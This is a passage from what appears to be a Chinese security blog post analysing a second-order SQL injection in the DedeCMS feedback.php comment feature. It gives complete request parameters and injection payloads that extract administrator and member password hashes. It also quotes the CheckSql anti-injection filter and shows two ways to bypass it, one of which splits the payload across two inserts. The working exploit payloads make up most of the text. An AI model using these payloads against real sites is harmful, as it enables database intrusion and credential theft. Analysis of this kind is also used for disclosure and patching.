<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">第二次</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">insert</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span class="15" style="color:#0000ff;font-size:10pt;font-family:宋体;"><a href="http://127.0.0.1/dede/plus/feedback.php" target="_blank" rel="noopener">http://127.0.0.1/dede/plus/feedback.php</a></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">?action=send</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&amp;comtype=reply</span><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&amp;fid=27</span><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;isconfirm=yes</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;cmtuser=admin</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;msg=asfsafsdaf</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;face=6</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&amp;validate=angr</span><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;title=1</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;sbbt=%E5%8F%91%E9%80%81%E8%AF%84%E8%AE%BA</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">看出我们第一次</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">insert</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">的</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">payload<span style="font-family:宋体;">是：</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">1’,”’”,1,3,4,5,6,7,8,(select&nbsp;pwd&nbsp;from&nbsp;%23@__admin))%23</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">数据库：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><img src="http://www.safekeyer.com/wp-content/uploads/2013/05/20130503224314_33278.jpg" alt=""><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">返回结果：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><img src="http://www.safekeyer.com/wp-content/uploads/2013/05/20130503224331_37947.jpg" alt=""><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">绕过具体代码分析：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<pre class="brush:php; toolbar: true; auto-links: true;">function CheckSql($db_string,$querytype=’select’)
    {
        ?????（此处省略）
        while (TRUE)
        {
            $pos = strpos($db_string, ’’’, $pos + 1);
            if ($pos === FALSE)
            {
                break;
            }
            $clean .= substr($db_string, $old_pos, $pos - $old_pos);
            while (TRUE)
            {
                $pos1 = strpos($db_string, ’’’, $pos + 1);
                $pos2 = strpos($db_string, ’\’, $pos + 1);
                if ($pos1 === FALSE)
                {
                    break;
                }
                elseif ($pos2 == FALSE || $pos2 &gt; $pos1)
                {
                    $pos = $pos1;
                    break;
                }
                $pos = $pos2 + 1;
            }
            $clean .= ’$s$’;
            $old_pos = $pos + 1;
        }
        $clean .= substr($db_string, $old_pos);
//echo $clean;exit();
        $clean = trim(strtolower(preg_replace(array(’~s+~s’ ), array(’ ’), $clean)));
        ????（此处省略）    
}</pre>

<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">上述检测代码作用就是替换<span style="font-family:’Times New Roman’;">sql</span><span style="font-family:宋体;">语句中两个引号之间的内容为</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">$s$</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">第二次</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">insert<span style="font-family:宋体;">的</span><span style="font-family:’Times New Roman’;">sql:</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">INSERT&nbsp;INTO&nbsp;</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;"><code>#@__feedback</code>(<code>aid</code>,<code>typeid</code>,<code>username</code>,<code>arctitle</code>,<code>ip</code>,<code>ischeck</code>,<code>dtime</code>,<code>mid</code>,<code>bad</code>,<code>good</code>,<code>ftype</code>,<code>face</code>,<code>msg</code>)&nbsp;</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">VALUES&nbsp;</span><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’Times New Roman’;">(’1’,’0’,’test’,’1’,”’”,1,3,4,5,6,7,8,(select&nbsp;pwd&nbsp;from&nbsp;dede_admin))#’,’127.0.0.1’,’1’,’1367583435’,’2’,’0’,’0’,’feedback’,’6’,’asfsafsdaf’)</span><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="font-size:10.5pt;font-family:宋体;">经过上述处理：</span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">INSERT&nbsp;INTO&nbsp;</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;"><code>dede_feedback</code>(<code>aid</code>,<code>typeid</code>,<code>username</code>,<code>arctitle</code>,<code>ip</code>,<code>ischeck</code>,<code>dtime</code>,<code>mid</code>,<code>bad</code>,<code>good</code>,<code>ftype</code>,<code>face</code>,<code>msg</code>)&nbsp;</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">VALUES&nbsp;($s$,$s$,$s$,$s$,”$s$,$s$,$s$,$s$,$s$,$s$,$s$,$s$,$s$,$s$)</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">然后</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">function&nbsp;CheckSql($db_string,$querytype=’select’)</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">得检测绕过了。</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">重点在关于单引号的处理，用双引号引上单引号，使单引号作为字符串，单引号在绕过注入检测起了重要作用，又使之在完整的</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">insert<span style="font-family:宋体;">不能发挥单引号作用，只作为字符串。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;"><span style="font-family:宋体;"></span></span></p>
<p></p>
<p><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x03&nbsp;<span style="font-family:宋体;">方法二：两次插入结合法</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="font-size:10.5pt;font-family:宋体;">理论：<span style="font-family:’Times New Roman’;">insert&nbsp;–&gt;&nbsp;select&nbsp;–&gt;insert&nbsp;–&gt;select</span></span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="font-size:10.5pt;font-family:宋体;">Exp:<span style="font-family:宋体;">（红色表示重点数据）</span></span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="font-size:10.5pt;font-family:宋体;">第一次<span style="font-family:’Times New Roman’;">insert</span></span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span class="15" style="mso-spacerun:’yes’;font-size:10.0000pt;font-family:’宋体’;"><a href="http://127.0.0.1/dede/plus/feedback.php" target="_blank" rel="noopener">http://127.0.0.1/dede/plus/feedback.php</a></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">?action=send</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&amp;comtype=comments</span><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;aid=1</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;isconfirm=yes</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;cmtuser=admin</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;msg=asfsafsdaf</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;face=6</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&amp;validate=slep</span><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&amp;title=1’,(char(@<code>’</code>)),/&amp;#42</span><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&amp;sbbt=%E5%8F%91%E9%80%81%E8%AF%84%E8%AE%BA</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">第二次</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">insert</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span class="15" style="mso-spacerun:’yes’;font-size:10.0000pt;font-family:’宋体’;"><a href="http://127.0.0.1/dede/plus/feedback.php" target="_blank" rel="noopener">http://127.0.0.1/dede/plus/feedback.php</a></span><a href="http://127.0.0.1/dede/plus/feedback.php?aid=1&amp;action=send&amp;comtype=reply&amp;fid=48&amp;isconfirm=yes&amp;validate=craf&amp;msg=&amp;#42/1,2,3,4,5,6,7,(select/&amp;#42&amp;#42/concat(userid,0x3a,pwd" target="_blank" rel="noopener"><span class="15" style="mso-spacerun:’yes’;font-size:10.0000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></a>/&amp;#42&amp;#42/from/&amp;#42&amp;#42/dede_member/&amp;#42&amp;#42/limit/&amp;#42&amp;#42/1))%23)</p>
<p><span class="15" style="mso-spacerun:’yes’;font-size:10.0000pt;font-family:’宋体’;">?aid=1</span><span class="15" style="mso-spacerun:’yes’;font-size:10.0000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span class="15" style="mso-spacerun:’yes’;font-size:10.0000pt;font-family:’宋体’;">&amp;action=send</span><span class="15" style="mso-spacerun:’yes’;font-size:10.0000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span class="15" style="mso-spacerun:’yes’;color:#ff0000;font-size:10.0000pt;font-family:’宋体’;">&amp;comtype=reply</span><span class="15" style="mso-spacerun:’yes’;color:#ff0000;font-size:10.0000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span class="15" style="mso-spacerun:’yes’;color:#ff0000;font-size:10.0000pt;font-family:’宋体’;">&amp;fid=48</span><span class="15" style="mso-spacerun:’yes’;color:#ff0000;font-size:10.0000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span class="15" style="mso-spacerun:’yes’;font-size:10.0000pt;font-family:’宋体’;">&amp;isconfirm=yes</span><span class="15" style="mso-spacerun:’yes’;font-size:10.0000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span class="15" style="mso-spacerun:’yes’;color:#ff0000;font-size:10.0000pt;font-family:’宋体’;">&amp;validate=craf</span><span class="15" style="mso-spacerun:’yes’;color:#ff0000;font-size:10.0000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span class="15" style="mso-spacerun:’yes’;color:#ff0000;font-size:10.0000pt;font-family:’宋体’;">&amp;msg=&amp;#42/1,2,3,4,5,6,7,(select/&amp;#42&amp;#42/concat(userid,0x3a,pwd)/&amp;#42&amp;#42/from/&amp;#42&amp;#42/dede_member/&amp;#42&amp;#42/limit/&amp;#42&amp;#42/1))%23</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">通过两次</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">insert<span style="font-family:宋体;">向数据库中插入</span><span style="font-family:’Times New Roman’;">payload</span><span style="font-family:宋体;">的不同部分，然后组合起来成为一个完整的</span><span style="font-family:’Times New Roman’;">payload</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">第一次插入：</span><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">1’,(char(@<code>’</code>)),/&amp;#42</span><span style="mso-spacerun:’yes’;color:#ff0000;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">第二次插入：</span><span class="15" style="mso-spacerun:’yes’;color:#ff0000;font-size:10.0000pt;font-family:’宋体’;">&amp;#42/1,2,3,4,5,6,7,(select/&amp;#42&amp;#42/concat(userid,0x3a,pwd)/&amp;#42&amp;#42/from/&amp;#42&amp;#42/dede_member/&amp;#42&amp;#42/limit/&amp;#42&amp;#42/1))%23</span><span class="15" style="mso-spacerun:’yes’;color:#ff0000;text-decoration:underline;font-size:10.0000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span class="15" style="mso-spacerun:’yes’;color:#ff0000;text-decoration:underline;font-size:10.0000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span class="15" style="mso-spacerun:’yes’;font-size:10.0000pt;font-family:’宋体’;">组成最后完整的语句：</span><span class="15" style="mso-spacerun:’yes’;font-size:10.0000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">INSERT&nbsp;INTO&nbsp;</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;"><code>#@__feedback</code>(<code>aid</code>,<code>typeid</code>,<code>username</code>,<code>arctitle</code>,<code>ip</code>,<code>ischeck</code>,<code>dtime</code>,<code>mid</code>,<code>bad</code>,<code>good</code>,<code>ftype</code>,<code>face</code>,<code>msg</code>)&nbsp;</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">VALUES&nbsp;</span><span class="15" style="color:#0000ff;font-size:10.5pt;font-family:’Times New Roman’;">(’1’,’0’,’test’,’1’,</span><span class="15" style="color:#ff0000;font-size:10.5pt;font-family:’Times New Roman’;">(char(@<code>’</code>)),/&amp;#42</span><span class="15" style="color:#0000ff;font-size:10.5pt;font-family:’Times New Roman’;">’,’127.0.0.1’,’1’,’1367591176’,’2’,’0’,’0’,’feedback’,’0’,’</span><span class="15" style="color:#ff0000;font-size:10.5pt;font-family:’Times New Roman’;">@<code>’</code>&amp;#42/,2,3,4,5,6,7,8,(selectconcat(userid,0x7c,pwd)from#@__admin))</span><span class="15" style="color:#0000ff;font-size:10.5pt;font-family:’Times New Roman’;">’)</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">经过防注入函数处理：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">insert&nbsp;into&nbsp;<code>dede_feedback</code>(<code>aid</code>,<code>typeid</code>,<code>username</code>,<code>arctitle</code>,<code>ip</code>,<code>ischeck</code>,<code>dtime</code>,<code>mid</code>,<code>bad</code>,<code>good</code>,<code>ftype</code>,<code>face</code>,<code>msg</code>)&nbsp;values&nbsp;($s$,$s$,$s$,$s$,(char(@`$s$,$s$,$s$,$s$,$s$,$s$,$s$,$s$,$s$,$s$)</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">完全没有问题绕过。</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">数据库：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><img src="http://www.safekeyer.com/wp-content/uploads/2013/05/20130503224501_39719.png" alt=""><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">返回结果：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><img src="http://www.safekeyer.com/wp-content/uploads/2013/05/20130503224512_48447.png" alt=""><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x03&nbsp;<span style="font-family:宋体;">结束语</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;"><span style="font-family:宋体;"></span></span></p>
<p></p>
<p><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
<p><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">如有错误希望指正，如有建议希望讨论。<span style="font-family:’Times New Roman’;"><a href="http://www.safekeyer.com" target="_blank" rel="noopener">www.safekeyer.com</a></span></span></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">John Doe</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">166</span>
                  <span class="site-state-item-name">Artikel</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">13</span>
                  <span class="site-state-item-name">Kategorien</span>
                
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">182</span>
                  <span class="site-state-item-name">Tags</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2011 &mdash; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
